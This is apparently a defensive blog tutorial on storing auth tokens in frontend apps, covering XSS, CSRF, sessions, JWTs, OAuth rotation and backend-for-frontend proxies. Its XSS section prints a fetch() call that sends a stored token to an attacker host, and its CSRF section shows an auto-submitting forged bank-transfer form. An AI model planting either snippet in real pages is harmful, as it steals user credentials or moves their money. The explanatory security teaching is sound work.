@@ -1,0 +1,1946 @@
+Table of Contents
+The basics
+What XSS does to that token
+”If they can run JS, you’re already dead”
+Attempt two: hold it in memory
+Attempt three: the httpOnly cookie
+CSRF
+Sessions vs JWTs
+Where JWTs work
+OAuth
+Wiring this into actual React
+Can we make it more secure?
+The NEW threat
+The end
+References
+
+Ask ten frontend developers where to store a login token, and you’ll get four answers and an argument.
+
+And because each approach addresses different concerns, the debates continue without resolution.
+
+So let’s clarify once and for all: What are the options to store a token, which are the most secure and what are the use cases.
+
+I go much deeper on XSS and CSRF in my 
+FREE frontend security course
+, but I wanted to tackle auth on its own.
+
+The basics
+
+I’ve written this, you might have too. Every “build a full-stack app in an afternoon” article and tutorial has written this.
+
+The user submits a login form; the server checks the password and returns a token. You put it in localStorage and attach it to every request from then on:
+
+async
+ function
+ login
+(
+email
+:
+ string
+, 
+password
+:
+ string
+) {
+
+  const
+ res
+ =
+ await
+ fetch
+(
+'/api/login'
+, {
+
+    method: 
+'POST'
+,
+
+    headers: { 
+'Content-Type'
+: 
+'application/json'
+ },
+
+    body: 
+JSON
+.
+stringify
+({ email, password }),
+
+  });
+
+  const
+ { 
+token
+ } 
+=
+ await
+ res.
+json
+();
+
+  localStorage.
+setItem
+(
+'token'
+, token);
+
+}
+
+async
+ function
+ fetchProfile
+() {
+
+  const
+ res
+ =
+ await
+ fetch
+(
+'/api/me'
+, {
+
+    headers: {
+
+      Authorization: 
+`Bearer ${
+localStorage
+.
+getItem
+(
+'token'
+)
+}`
+,
+
+    },
+
+  });
+
+  return
+ res.
+json
+();
+
+}
+
+That token is almost always a JWT.
+
+A JWT (JSON Web Token) is a string in three parts, separated by dots: a header, a payload, and a signature. The payload contains facts about the user, such as their ID and maybe their role.
+
+The signature is a stamp that proves your server produced this exact payload and that no one tampered with it.
+
+The trick that made JWTs popular is what the server does when it receives the token. It re-computes the stamp, checks it matches, and then trusts the payload without looking anything up.
+
+The user’s ID is 
+inside
+ the token, cryptographically vouched for, so there’s no database row to read to get the userID or to verify the user.
+
+People call this “stateless”.
+
+And to be fair to the tutorials, this works.
+
+It survives refreshes because localStorage persists, and it sidesteps every cookie headache.
+
+The 
+Authorization: Bearer
+ header also travels across domains cleanly, so an app on one domain can call an API on another without much thought.
+
+JWT works, but the code we wrote has exactly one problem: where we stored the JWT.
+
+What XSS does to that token
+
+localStorage has one defining trait: any JavaScript on your page can read all of it.
+
+Whose JavaScript runs on your page?
+
+Yours, sure. But also every npm package you installed, and every package 
+those
+ packages pulled in. Your analytics snippet. Your support chat widget. Anything a browser extension decides to inject.
+
+And, the day it happens, an attacker’s.
+
+That last one is XSS. Cross-site scripting means an attacker has gotten their code to run on your page. Usually through something dull: a comment field that renders user text as HTML without escaping it, a URL parameter reflected straight into the DOM, or a dependency that shipped malicious code in a patch release.
+
+When that happens, the token is one line from gone:
+
+fetch
+(
+'https://attacker.example/collect'
+, {
+
+  method: 
+'POST'
+,
+
+  body: localStorage.
+getItem
+(
+'token'
+),
+
+});
+
+The attacker now has your bearer token, and “bearer” is literal (It does not come from the show The Bear): whoever bears it 
+is
+ you. The server checks the stamp, sees a valid payload, and says hello.
+
+They no longer need your browser. They don’t need your tab open. They paste that string into a script on their own machine, and your API treats them as you, from anywhere on earth, until the token expires (mostly).
+
+If you signed that token with a 7-day expiry, as plenty of tutorials do, that’s a 7-day skeleton key.
+
+You can’t cancel it, because the whole point of “stateless” was that the server checks nothing.
+
+Everything the attacker does next happens on their infrastructure, on their schedule, completely invisible to you.
+
+”If they can run JS, you’re already dead”
+
+A common saying is that if an attacker can run JavaScript on your page, they can already do anything.
+
+Read everything on screen, fire requests from the user’s browser, ride whatever credentials the browser attaches. Hiding the token changes nothing.
+
+The first half is true. Protecting the token does 
+not
+ stop XSS. Anyone who tells you an HTTP-only cookie “prevents XSS” is confused or selling something.
+
+But look at what the attacker is limited to in each case, because they are not the same case.
+
+If the attacker can 
+read
+ the token, they take it home. The attack keeps working after the tab closes, from their own machine, at their own pace, for the full lifetime of the token.
+
+If the attacker 
+cannot
+ read the token, they can only ride the live session.
+
+Their script fires requests from inside the victim’s browser while that tab is open, and every one of those requests lands on your server, where your rate limits, logging, and fraud checks live.
+
+One is a stolen key. The other is a burglar who can only act while standing inside your house, in front of your cameras, and only until the owner walks out.
+
+You’d obviously rather have neither, but XSS bugs ship eventually.
+
+The realistic goal is to reduce how often XSS bugs ship and to shrink what they can do when it happens.
+
+Security folks call it reducing the blast radius, so let’s set our goal: get the token to a location where JavaScript can’t read it.
+
+Attempt two: hold it in memory
+
+First instinct: skip storage entirely, keep the token in a plain variable.
+
+let
+ accessToken
+:
+ string
+ |
+ null
+ =
+ null
+;
+
+async
+ function
+ login
+(
+email
+:
+ string
+, 
+password
+:
+ string
+) {
+
+  const
+ res
+ =
+ await
+ fetch
+(
+'/api/login'
+, {
+
+    method: 
+'POST'
+,
+
+    headers: { 
+'Content-Type'
+: 
+'application/json'
+ },
+
+    body: 
+JSON
+.
+stringify
+({ email, password }),
+
+  });
+
+  const
+ { 
+token
+ } 
+=
+ await
+ res.
+json
+();
+
+  accessToken 
+=
+ token; 
+// lives in memory, never written to disk
+
+}
+
+A plain variable like that (it lives in the module’s scope, not on any object an attacker can list) is meaningfully harder to grab than localStorage. LocalStorage is a public bulletin board that an attacker can enumerate key by key.
+
+A loose variable is at least something they have to know exists and can name.
+
+Harder, though, isn’t safe. The attacker’s code runs in the 
+same JavaScript world
+ as yours.
+
+It can replace 
+window.fetch
+ with its own version, wait for your app to attach the 
+Authorization
+ header, and copy the token as it flies past.
+
+And you paid a steep price for that narrowing. If your user refreshes the page, and the JavaScript world is rebuilt from nothing.
+
+Your variable is gone and the user is logged out.
+
+Open a second tab, and it has its own memory, its own empty 
+accessToken
+, and no idea the first tab exists. Logged out there too.
+
+Nobody ships an app that logs you out on every refresh, so what you can add is to use a second, longer-lived credential whose only job is to silently mint new access tokens.
+
+It’s called a refresh token. But then where does the refresh token live?
+
+Put it in localStorage, and we’re back to square one. The attacker grabs the refresh token instead and mints fresh access tokens forever.
+
+We walked in a circle.
+
+JavaScript-reachable storage cannot safely hold a long-lived credential.
+
+We need a spot in the browser that JavaScript flat-out cannot reach.
+
+Attempt three: the httpOnly cookie
+
+Cookies have a bad reputation, mostly because the only time normies meet them is in a consent banner. Underneath the banner nonsense, a cookie is a small value the server asks the browser to store and then automatically attaches to every request sent back to that server.
+
+The server sets one with a response header, and we can protect it with a couple of extra flags:
+
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
+
+Each flag tightens security.
+
+HttpOnly
+ tells the browser: never hand this cookie to JavaScript. 
+document.cookie
+ won’t show it. No script can read it, including the attacker’s script mid-XSS. The browser attaches it to outgoing requests, and that is the 
+only
+ thing that can ever happen to it.
+
+Secure
+ says only send it over HTTPS, so it never crosses a coffee-shop network in plain text.
+
+SameSite=Lax
+ means don’t attach this cookie when the request comes from a different site( with one exception we’ll hit in a second).
+
+By using this your frontend actually gets 
+simpler
+, which is a pleasant surprise.
+
+There’s no token to manage, so login is just a request, and later requests only need to opt into sending credentials:
+
+async
+ function
+ login
+(
+email
+:
+ string
+, 
+password
+:
+ string
+) {
+
+  await
+ fetch
+(
+'/api/login'
+, {
+
+    method: 
+'POST'
+,
+
+    credentials: 
+'include'
+, 
+// browser handles the cookie from here
+
+    headers: { 
+'Content-Type'
+: 
+'application/json'
+ },
+
+    body: 
+JSON
+.
+stringify
+({ email, password }),
+
+  });
+
+  // Nothing in the response body to store. There's no token in our code at all.
+
+}
+
+async
+ function
+ fetchProfile
+() {
+
+  const
+ res
+ =
+ await
+ fetch
+(
+'/api/me'
+, { credentials: 
+'include'
+ });
+
+  return
+ res.
+json
+();
+
+}
+
+But 
+httpOnly
+ stops 
+exfiltration
+, not 
+abuse
+.
+
+During an XSS attack, the attacker can absolutely still do damage by making requests in place; they just can’t walk off with the credentials and use them next Tuesday from their laptop.
+
+CSRF
+
+You’re logged into your bank. The session cookie sits in your browser.
+
+In another tab, you open a sketchy coupon site, and its page quietly contains this:
+
+<!-- served from evil-coupons.example -->
+
+<
+form
+ action
+=
+"https://bank.example/transfer"
+ method
+=
+"POST"
+>
+
+  <
+input
+ type
+=
+"hidden"
+ name
+=
+"to"
+ value
+=
+"attacker"
+ />
+
+  <
+input
+ type
+=
+"hidden"
+ name
+=
+"amount"
+ value
+=
+"1000"
+ />
+
+</
+form
+>
+
+<
+script
+>document.forms[
+0
+].
+submit
+();</
+script
+>
+
+The form auto-submits on page load. The request goes to your bank, and the browser sees a request bound for 
+bank.example
+, checks its jar for cookies for that site, finds your session cookie, and attaches it.
+
+Because that’s the deal with cookies. They ride along automatically.
+
+Your bank receives a request that appears to be your real session, as if you clicked “transfer.” The money is gone.
+
+That’s CSRF, cross-site request forgery: a foreign page tricking your browser into sending an authenticated request you never meant to send.
+
+Notice the old localStorage version was immune to this.
+
+A foreign site can’t read your localStorage, so it could never build that 
+Authorization
+ header.
+
+Switching to cookies traded the exfiltration problem for the forgery problem.
+
+The good news: forgery is a mostly solved problem, with a well-documented stack of defenses.
+
+The primary defense is a CSRF token.
+ The server plants an unpredictable value in your page, and every state-changing request has to send that value back.
+
+The forged form on the coupon site can’t read your page (the same-origin policy stops it), so it can never know the value, so its request fails the check.
+
+The common pattern for an API-driven app is “double submit”: the server sets the token as a readable cookie, and your frontend copies it into a header on each mutating request.
+
+The server accepts the request only if the cookie and the header match.
+
+// The token is in a readable (not HTTP-only) cookie set by the server.
+
+function
+ getCsrfToken
+() {
+
+  return
+ document.cookie
+
+    .
+split
+(
+'; '
+)
+
+    .
+find
+((
+c
+) 
+=>
+ c.
+startsWith
+(
+'csrf_token='
+))
+
+    ?.
+split
+(
+'='
+)[
+1
+];
+
+}
+
+async
+ function
+ post
+(
+path
+:
+ string
+, 
+body
+:
+ unknown
+) {
+
+  return
+ fetch
+(path, {
+
+    method: 
+'POST'
+,
+
+    credentials: 
+'include'
+,
+
+    headers: {
+
+      'Content-Type'
+: 
+'application/json'
+,
+
+      'X-CSRF-Token'
+: 
+getCsrfToken
+() 
+??
+ ''
+, 
+// echo it back in a header
+
+    },
+
+    body: 
+JSON
+.
+stringify
+(body),
+
+  });
+
+}
+
+The attacker’s forged form can set cookies going out, but it cannot set that header, because the browser only lets 
+your
+ JavaScript, running on 
+your
+ origin, add custom headers to a request.
+
+Second line of defense: SameSite.
+ 
+SameSite=Lax
+ (or 
+Strict
+) tells the browser not to attach the cookie on cross-site requests, which blocks that hidden coupon-site form.
+
+Dont let this be your only line of defense, though, because it has two problems.
+
+The first problem is Lax’s exception for top-level GET navigations. When a user clicks a link to your site, Lax 
+does
+ send the cookie, which is what lets an emailed dashboard link land a user logged in.
+
+Then we need to make sure: 
+GET requests must never change data.
+ If a GET can transfer money, Lax forges it happily, and so does an attacker using a framework’s “method override” to disguise a GET as a POST.
+
+The second problem is the word “site.” 
+SameSite
+ guards 
+same-site
+, not 
+same-origin
+, and those are different things. 
+app.example.com
+ and 
+payments.example.com
+ are the same 
+site
+, so SameSite does nothing between your own subdomains.
+
+Third lin of defense: check where the request came from.
+ Browsers stamp requests with headers the sending page can’t forge, 
+Origin
+ and the newer 
+Sec-Fetch-Site
+.
+
+Your server reads them and drops anything that isn’t same-origin on a mutating route:
+
+// Express middleware, ahead of any mutating route
+
+app.
+use
+((
+req
+, 
+res
+, 
+next
+) 
+=>
+ {
+
+  if
+ ([
+'POST'
+, 
+'PUT'
+, 
+'PATCH'
+, 
+'DELETE'
+].
+includes
+(req.method)) {
+
+    const
+ site
+ =
+ req.
+get
+(
+'Sec-Fetch-Site'
+);
+
+    if
+ (site 
+&&
+ site 
+!==
+ 'same-origin'
+) {
+
+      return
+ res.
+status
+(
+403
+).
+json
+({ error: 
+'cross-site request rejected'
+ });
+
+    }
+
+  }
+
+  next
+();
+
+});
+
+So CSRF token first, then SameSite, and finally origin checks.
+
+There’s also another trick you can use: the 
+__Host-
+ prefix.
+
+Name your session cookie 
+__Host-session,
+ and the browser refuses to accept it unless it’s 
+Secure
+, has no 
+Domain
+ attribute (so it’s locked to the exact host, no subdomains), and has 
+Path=/
+.
+
+It’s a free security improvement, and with only one cookie rename, OWASP calls the 
+__Host-
+ prefixed cookie the most secure configuration there is.
+
+Set-Cookie: __Host-session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
+
+Sessions vs JWTs
+
+So far, we compared localStorage vs. cookies and concluded that a cookie with the three CSRF guardrails is the most secure.
+
+Then, should we just store the JWT in the cookies?
+
+Look back at the last code example. I called it 
+session=abc123
+, not 
+token=eyJhbGciOi...
+.
+
+The JWT earned its spot by being stateless.
+
+But statelessness has a dark side that only shows up when something goes wrong. A JWT is valid until it expires, and there is no way to undo it.
+
+The user hits “log out”? The token in their hand is still valid.
+
+The user changes their password after a scary email? Old tokens still work.
+
+You ban an account for abuse? That account’s token keeps working until the expiry you picked passes.
+
+You have to mitigate this with a server-side list of revoked tokens you check on every request.
+
+Read that back slowly: a list, on the server, checked every request.
+
+You’ve rebuilt server-side sessions, except with larger tokens.
+
+So the boring 2005 design wins. The cookie holds a long random string that means nothing on its own, and the server keeps a row matching that string to a user:
+
+app.
+post
+(
+'/api/login'
+, 
+async
+ (
+req
+, 
+res
+) 
+=>
+ {
+
+  const
+ user
+ =
+ await
+ verifyPassword
+(req.body.email, req.body.password);
+
+  const
+ sessionId
+ =
+ crypto.
+randomBytes
+(
+32
+).
+toString
+(
+'hex'
+); 
+// opaque, meaningless
+
+  await
+ db.sessions.
+create
+({ id: sessionId, userId: user.id });
+
+  res.
+cookie
+(
+'__Host-session'
+, sessionId, {
+
+    httpOnly: 
+true
+,
+
+    secure: 
+true
+,
+
+    sameSite: 
+'lax'
+,
+
+    path: 
+'/'
+,
+
+  });
+
+  res.
+json
+({ ok: 
+true
+ });
+
+});
+
+One important tip here: issue a brand-new session ID at login, and never reuse one the client handed you. If you keep whatever session ID was already in the browser, an attacker can plant a known ID before login and inherit the session afterward (this is called session fixation).
+
+The same move applies any time the session gains power, not just at login. Passing a 2FA check, elevating to admin, stepping into an area that needed re-auth, reset password etc: generate a fresh ID at each of those.
+
+Login is only a third of it, though; something has to turn that cookie back into “this is Jane” on every subsequent request:
+
+// Runs before your routes. Reads the cookie, finds the user, or leaves it null.
+
+app.
+use
+(
+async
+ (
+req
+, 
+res
+, 
+next
+) 
+=>
+ {
+
+  const
+ sessionId
+ =
+ req.cookies[
+'__Host-session'
+];
+
+  const
+ session
+ =
+ sessionId 
+?
+ await
+ db.sessions.
+get
+(sessionId) 
+:
+ null
+;
+
+  // Attach the user to the request so every route below can see it
+
+  req.user 
+=
+ session 
+?
+ await
+ db.users.
+get
+(session.userId) 
+:
+ null
+;
+
+  next
+();
+
+});
+
+// A protected route now reads req.user and trusts it, because the
+
+// middleware already did the work.
+
+app.
+get
+(
+'/api/orders'
+, 
+async
+ (
+req
+, 
+res
+) 
+=>
+ {
+
+  if
+ (
+!
+req.user) 
+return
+ res.
+status
+(
+401
+).
+json
+({ error: 
+'not logged in'
+ });
+
+  res.
+json
+(
+await
+ db.orders.
+findByUser
+(req.user.id));
+
+});
+
+This design beats the stateless JWT for a single app. The user’s current role, whether they’re banned, whether they just got downgraded from admin ten seconds ago, all of it is fresh on every request, because you’re reading it live instead of trusting a claim a token baked in an hour ago.
+
+Logout, which I keep saying is “just deleting the row,” is exactly that:
+
+app.
+post
+(
+'/api/logout'
+, 
+async
+ (
+req
+, 
+res
+) 
+=>
+ {
+
+  const
+ sessionId
+ =
+ req.cookies[
+'__Host-session'
+];
+
+  if
+ (sessionId) 
+await
+ db.sessions.
+delete
+(sessionId); 
+// the session is now gone, server-side
+
+  res.
+clearCookie
+(
+'__Host-session'
+);
+
+  res.
+json
+({ ok: 
+true
+ });
+
+});
+
+The session dies the instant that row is deleted, everywhere and on every device, with no waiting for a token to expire.
+
+The database-lookup JWTs you’re promised save you a sub-millisecond hit on an indexed table, or a Redis read if you’re chasing microseconds.
+
+For one backend serving one frontend, statelessness solved a scaling problem you didn’t have and created a revocation problem you didn’t want.
+
+Where JWTs work
+
+I don’t want to leave you thinking JWTs are bad.
+
+JWTs shine wherever verifying a token is better than sharing a database. Your API gateway calls an internal billing service, which calls a notifications service (In an internal Kubernetics network with thousands of microservices).
+
+A short-lived JWT rides along, and each service checks the user’s identity locally rather than all three hammering a single session store.
+
+Single sign-on runs on the same idea. Click “Sign in with Google,” and Google hands your app a JWT that asserts “yes, this is really this person.” Your app reads it once, starts 
+its own
+ session, and throws the JWT away.
+
+OAuth
+
+Speaking about about “Sign in with Google”.
+
+When your app talks to an OAuth provider, you don’t get to pick the token format. You receive an access token and a refresh token.
+
+The access token lives in memory, exactly like attempt two with our variable.
+
+It’s short-lived, five to fifteen minutes, so the worst case for an attacker who snags one is a fifteen-minute window before it’s useless.
+
+The refresh token lives in an httpOnly cookie, scoped by 
+path,
+ so the browser only ever sends it to the one endpoint that generates new access tokens:
+
+res.
+cookie
+(
+'refresh_token'
+, refreshToken, {
+
+  httpOnly: 
+true
+,
+
+  secure: 
+true
+,
+
+  sameSite: 
+'strict'
+,
+
+  path: 
+'/api/refresh'
+, 
+// sent here and nowhere else
+
+});
+
+Notice that this cookie can’t use the 
+__Host-
+ prefix we used for the session cookie, because that prefix requires 
+Path=/
+, whereas here we’re deliberately narrowing the path.
+
+Now the refresh cycle fixes some of our previous problems with in-memory storage. Page refresh wipes your in-memory access token, so on load, your app quietly calls 
+/api/refresh
+.
+
+The browser attaches the cookie, the server returns a fresh access token, and the user never sees a login screen.
+
+One more mechanism that makes this resilient is 
+rotation
+.
+
+Every time a refresh token is used, the server invalidates it and hands back a new one. Refresh tokens become single-use links in a chain, and the server remembers which chain each token belongs to.
+
+Now watch a theft play out.
+
+An attacker steals refresh token #4 and uses it. They get #5. They’re in.
+
+But your real app still holds #4, and on its next scheduled refresh (after the 15’ window), it presents #4, a token the server has already seen consumed.
+
+A single-use token showing up a second time is impossible in normal operation. It is a signature of theft.
+
+The server responds by burning the entire chain, including the attacker’s shiny #5, and forcing a fresh login.
+
+The stolen credential defuses itself.
+
+(Small side note: two tabs refreshing at the same millisecond can trip that same alarm and log a legitimate user out. Real implementations add a small grace period during which the just-rotated token is still accepted, so honest concurrency doesn’t read as an attack. If you turn on rotation and start getting mystery logout reports, this is almost always why.)
+
+Auth0, Okta, and every serious provider run rotation with reuse detection by default, and RFC 9700, the current OAuth security best practice from early 2025, requires rotation or an equivalent for browser clients.
+
+This split pattern is genuinely good, and it’s also the best you can do while tokens still touch the browser.
+
+Wiring this into actual React
+
+Everything so far has been login functions and cookie flags. If you’re a React developer, you’re probably wondering where any of this touches a component.
+
+You never want components sprinkling 
+Authorization
+ headers everywhere. You want one wrapper around 
+fetch
+ that attaches the access token, and, when the token has expired, transparently refreshes it and retries.
+
+Components just call 
+api()
+ and stay ignorant of everything else.
+
+let
+ accessToken
+:
+ string
+ |
+ null
+ =
+ null
+;
+
+async
+ function
+ api
+(
+path
+:
+ string
+, 
+options
+:
+ RequestInit
+ =
+ {}) {
+
+  const
+ res
+ =
+ await
+ fetch
+(path, {
+
+    ...
+options,
+
+    headers: { 
+...
+options.headers, Authorization: 
+`Bearer ${
+accessToken
+}`
+ },
+
+  });
+
+  if
+ (res.status 
+===
+ 401
+) {
+
+    // token expired, refresh and retry
+
+    const
+ refresh
+ =
+ await
+ fetch
+(
+'/api/refresh'
+, { credentials: 
+'include'
+ });
+
+    accessToken 
+=
+ (
+await
+ refresh.
+json
+()).token;
+
+    return
+ fetch
+(path, {
+
+      ...
+options,
+
+      headers: { 
+...
+options.headers, Authorization: 
+`Bearer ${
+accessToken
+}`
+ },
+
+    });
+
+  }
+
+  return
+ res;
+
+}
+
+The problem with this shows up under heavy load.
+
+Your dashboard mounts and fires five requests at once. The access token has expired, so all five return 401 at roughly the same time. All five call 
+/api/refresh
+.
+
+If you turned on refresh token rotation from earlier, the first refresh rotates the token, and the other four are now presenting a token that the server just retired.
+
+Reuse detected. The server burns the chain and logs your user out for the crime of loading a page.
+
+So you need the refreshes to collapse into one.
+
+The trick is to store the in-flight refresh 
+promise
+, not just fire a request. Everyone who arrives while a refresh is running awaits the same promise:
+
+let
+ accessToken
+:
+ string
+ |
+ null
+ =
+ null
+;
+
+let
+ refreshing
+:
+ Promise
+<
+string
+> 
+|
+ null
+ =
+ null
+;
+
+function
+ refreshAccessToken
+() {
+
+  // If a refresh is already in flight, everyone waits on that same one.
+
+  if
+ (
+!
+refreshing) {
+
+    refreshing 
+=
+ fetch
+(
+'/api/refresh'
+, { credentials: 
+'include'
+ })
+
+      .
+then
+((
+res
+) 
+=>
+ {
+
+        // Refresh itself can fail: the refresh token expired, or the rotation
+
+        // detected reuse and burned the chain. Either way, the session is over.
+
+        if
+ (
+!
+res.ok) 
+throw
+ new
+ Error
+(
+'refresh failed'
+);
+
+        return
+ res.
+json
+();
+
+      })
+
+      .
+then
+((
+data
+) 
+=>
+ {
+
+        accessToken 
+=
+ data.token;
+
+        return
+ data. token;
+
+      })
+
+      .
+finally
+(() 
+=>
+ {
+
+        refreshing 
+=
+ null
+; 
+// clear it so the next expiry can refresh again
+
+      });
+
+  }
+
+  return
+ refreshing;
+
+}
+
+async
+ function
+ api
+(
+path
+:
+ string
+, 
+options
+:
+ RequestInit
+ =
+ {}) {
+
+  const
+ send
+ =
+ (
+token
+:
+ string
+ |
+ null
+) 
+=>
+
+    fetch
+(path, {
+
+      ...
+options,
+
+      headers: { 
+...
+options.headers, Authorization: 
+`Bearer ${
+token
+}`
+ },
+
+    });
+
+  let
+ res 
+=
+ await
+ send
+(accessToken);
+
+  if
+ (res.status 
+===
+ 401
+) {
+
+    try
+ {
+
+      const
+ fresh
+ =
+ await
+ refreshAccessToken
+(); 
+// five callers, one refresh
+
+      res 
+=
+ await
+ send
+(fresh);
+
+    } 
+catch
+ {
+
+      // Refresh failed. Send them to log in, and don't let callers process the
+
+      // 401 in the meantime: return a promise that never resolves while the
+
+      // browser navigates away.
+
+      accessToken 
+=
+ null
+;
+
+      window.location.href 
+=
+ '/login'
+;
+
+      return
+ new
+ Promise
+<
+Response
+>(() 
+=>
+ {});
+
+    }
+
+  }
+
+  return
+ res;
+
+}
+
+Five 401s now share one refresh and one rotation, with no false alarms.
+
+Can we make it more secure?
+
+The IETF’s OAuth working group maintains a document, “OAuth 2.0 for Browser-Based Applications,” that ranks the possible architectures from most to least secure.
+
+At the top sits this pattern: The browser should hold 
+no
+ OAuth tokens. Not in memory, nor in a cookie.
+
+The pattern is Backend for Frontend, BFF. You put a thin server between your SPA and everything else, and that server does all the token handling on the frontend’s behalf.
+
+Your SPA holds exactly one thing: a boring httpOnly session cookie pointing at the BFF. It never sees a token in its life.
+
+Let’s see how it works.
+
+Your dashboard needs the user’s orders, so it calls 
+/api/orders
+ on the BFF, and the browser automatically attaches the session cookie, as it does with everything.
+
+That cookie is not a token. It’s a coat-check ticket, a random string that means nothing to anyone who steals it.
+
+The BFF catches that request and does the one job it exists for. It reads the session ID off the cookie, looks it up in its own store, and finds the real access token sitting there, the token that never left the server.
+
+It attaches that token as a bearer header, forwards the request to the actual API, waits for the orders to come back, and pipes them down to your browser.
+
+Your frontend got its orders.
+
+From the browser’s side, it asked a friendly server for data and got data, and every credential that made that happen stayed on the far side of a wall JavaScript can’t reach.
+
+The whole proxy is about fifteen lines:
+
+// The BFF. The browser only ever talks to this, never to the real API.
+
+app.
+all
+(
+'/api/*splat'
+, 
+async
+ (
+req
+, 
+res
+) 
+=>
+ {
+
+  // 1. The browser sent a session cookie, not a token.
+
+  const
+ sessionId
+ =
+ req.cookies[
+'__Host-session'
+];
+
+  const
+ session
+ =
+ sessionId 
+?
+ await
+ sessions.
+get
+(sessionId) 
+:
+ null
+;
+
+  if
+ (
+!
+session) 
+return
+ res.
+status
+(
+401
+).
+json
+({ error: 
+'not logged in'
+ });
+
+  // 2. Swap the cookie for the real access token, which never left this server.
+
+  let
+ accessToken 
+=
+ session.accessToken;
+
+  // 3. If it has expired, refresh the server-to-server connection before forwarding. If the refresh
+
+  // itself fails (token expired or revoked at the provider), the session is
+
+  // over: kill it and make the browser log in again.
+
+  if
+ (Date.
+now
+() 
+>=
+ session.expiresAt) {
+
+    try
+ {
+
+      const
+ refreshed
+ =
+ await
+ refreshWithProvider
+(session.refreshToken);
+
+      accessToken 
+=
+ refreshed.accessToken;
+
+      await
+ sessions.
+update
+(sessionId, refreshed); 
+// rotate + store the new pair
+
+    } 
+catch
+ {
+
+      await
+ sessions.
+delete
+(sessionId);
+
+      return
+ res.
+status
+(
+401
+).
+json
+({ error: 
+'session expired'
+ });
+
+    }
+
+  }
+
+  // 4. Forward the real API request with the bearer token that the browser never sees.
+
+  // originalUrl keeps the query string; req.path would drop ?page=2.
+
+  const
+ upstream
+ =
+ await
+ fetch
+(
+`https://api.example.com${
+req
+.
+originalUrl
+.
+replace
+(
+'/api'
+, 
+''
+)
+}`
+, {
+
+    method: req.method,
+
+    headers: {
+
+      Authorization: 
+`Bearer ${
+accessToken
+}`
+,
+
+      'Content-Type'
+: req.
+get
+(
+'Content-Type'
+) 
+??
+ 'application/json'
+,
+
+    },
+
+    body: [
+'GET'
+, 
+'HEAD'
+].
+includes
+(req.method) 
+?
+ undefined
+ :
+ JSON
+.
+stringify
+(req.body),
+
+  });
+
+  // Pass the status through. A 204 or other empty body has nothing to parse,
+
+  // so guard the json() call or it throws.
+
+  res.
+status
+(upstream.status);
+
+  const
+ text
+ =
+ await
+ upstream.
+text
+();
+
+  return
+ text 
+?
+ res.
+type
+(
+'json'
+).
+send
+(text) 
+:
+ res.
+end
+();
+
+});
+
+The token lives in 
+session.accessToken
+, which is a server-side value in your session store. It is never in the response to the browser, never in a cookie the browser can read, never in a variable any client script can reach.
+
+After the OAuth provider redirects back with a code, the BFF (a confidential client, so it holds a real secret) exchanges that code for tokens and stores them against a fresh session, handing the browser nothing but a cookie:
+
+// The OAuth callback. Runs once, at login.
+
+app.
+get
+(
+'/auth/callback'
+, 
+async
+ (
+req
+, 
+res
+) 
+=>
+ {
+
+  //Replace the code with tokens. This call carries the client secret,
+
+  // which is why it has to happen on a server and not in the browser.
+
+  const
+ tokens
+ =
+ await
+ exchangeCodeForTokens
+(req.query.code, 
+CLIENT_SECRET
+);
+
+  // Store the tokens server-side, keyed by a new random session ID.
+
+  const
+ sessionId
+ =
+ crypto.
+randomBytes
+(
+32
+).
+toString
+(
+'hex'
+);
+
+  await
+ sessions.
+create
+(sessionId, {
+
+    userId: tokens.userId,
+
+    accessToken: tokens.access_token,
+
+    refreshToken: tokens.refresh_token,
+
+    expiresAt: Date.
+now
+() 
++
+ tokens.expires_in 
+*
+ 1000
+,
+
+  });
+
+  // The browser leaves with a cookie and nothing else.
+
+  res.
+cookie
+(
+'__Host-session'
+, sessionId, {
+
+    httpOnly: 
+true
+, secure: 
+true
+, sameSite: 
+'lax'
+, path: 
+'/'
+,
+
+  });
+
+  res.
+redirect
+(
+'/'
+);
+
+});
+
+When the access token expires, the refresh in step 3 runs server-to-server, with rotation and reuse detection, and your frontend never knows it happened.
+
+The OAuth login itself even gets stronger. OAuth splits apps into two categories: those that can safely hold a secret key and those that can’t.
+
+A browser can’t; anything you ship to it, users can read, so an SPA is a “public client” and has to use weaker flows.
+
+A server can keep a secret, so the BFF is a “confidential client” and gets the stronger flow. Moving OAuth handling to the BFF upgrades your app from the weak to the strong category.
+
+This is the strongly recommended architecture for business applications, sensitive applications, and any application that touches personal data.
+
+Remember that if you use a BFF, you still have the CSRF problem from before, and make sure you guard against it with the three guardrails.
+
+The cost for this security is 
+latency
+ and extra infrastructure costs.
+
+You run a server now. Every API call takes two hops. The BFF scales with your traffic.
+
+The NEW threat
+
+Everything above is about a browser being tricked, an attacker’s script running in your page, and either stealing a credential or riding a session.
+
+And every fix, memory, httpOnly, BFF, is aimed at that.
+
+There’s a second threat that walks straight past all of it, and in 2026, it’s the one actually emptying accounts: infostealer malware.
+
+This is a program running on the user’s own computer, entirely outside the browser’s rules.
+
+It doesn’t need XSS. It doesn’t care about 
+HttpOnly
+. It reads Chrome’s cookie database off the disk, decrypts it, and copies your session cookie wholesale. 
+HttpOnly
+ only blocks 
+JavaScript
+ from reading the cookie.
+
+It does nothing to prevent a native process from reading the file.
+
+The attacker imports your cookie into their own browser, giving them access to your live session. This is a “pass-the-cookie” attack, and infostealer logs full of live session cookies are a booming market: one 2026 report counted 51.7 million infostealer log packages in 2025, up 72% year over year.
+
+Here’s the uncomfortable part: a perfectly implemented BFF, httpOnly, SameSite, rotation, the whole stack, does not stop this.
+
+The stolen cookie is a valid bearer credential, and your server has no way to tell the attacker’s browser from the user’s.
+
+But there is a solution: 
+binding the session to the device.
+
+Google shipped Device Bound Session Credentials (DBSC) to general availability in Chrome 146 on Windows in April 2026.
+
+At login, the browser generates a private key in a dedicated security chip on the machine (a TPM, the same hardware that backs Windows Hello and disk encryption), and that key cannot be physically copied out of the chip.
+
+The session cookie is short-lived, and to refresh it, the browser has to sign a challenge from the server using that sealed key, roughly every few minutes.
+
+Now the stolen cookie rots almost immediately. Within minutes, it expires, and the attacker can’t refresh it, because refreshing demands a signature from a key sealed in hardware they don’t have. The cookie they copied becomes a useless string.
+
+It’s Chrome on Windows first, with macOS via the Secure Enclave rolling out behind it, and other browsers still deciding.
+
+It needs server-side support to actually work. And if the malware is already on the machine 
+at login time
+, it may be able to interfere with registration.
+
+If you are building anything very, very sensitive, start reading the DBSC docs now.
+
+The end
+
+TLDR: 
+put the session in an httpOnly, server-backed cookie, and the moment third-party tokens enter the picture, move those tokens behind a BFF so the browser never holds them.
+
+You’re welcome.
+
+References
+
